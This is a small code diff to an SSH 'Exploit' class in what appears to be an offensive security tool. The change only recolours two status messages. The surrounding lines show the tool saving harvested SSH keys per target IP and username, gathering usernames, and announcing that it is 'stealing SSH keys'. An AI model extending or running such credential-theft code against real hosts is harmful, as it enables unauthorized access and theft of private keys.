@@ -33,7 +33,7 @@ class SSH(Exploit):
             keys = keys_bytes.decode(encoding='UTF-8')
             with open(f"./data/{ip_address}_{username}_sshkey.txt", "w") as text_file:
                 text_file.write(keys)
-            print(f"{Color.BGRN}Success.{Color.END} SSH keys saved in Data folder.", file=self.output)
+            print(f"{Color.BGRN}Success.{Color.END}{Color.BMAGEN} SSH keys saved in Data folder.{Color.END}", file=self.output)
         finally:
             stdin.close()
 
@@ -49,7 +49,7 @@ class SSH(Exploit):
                 print(f'{Color.BRED}Authentification failed.{Color.END}', file=self.output)
                 ssh.close()
             else:
-                print(f'{Color.BGRN}Success.{Color.END}Now gathering all usernames.', file=self.output)
+                print(f'{Color.BGRN}Success.{Color.END}{Color.BMAGEN}Now gathering all usernames.{Color.END}', file=self.output)
                 usernames = self.get_usernames(ssh)
                 
                 print(f'{Color.BMAGEN}Now stealing SSH keys.{Color.END}', file=self.output)
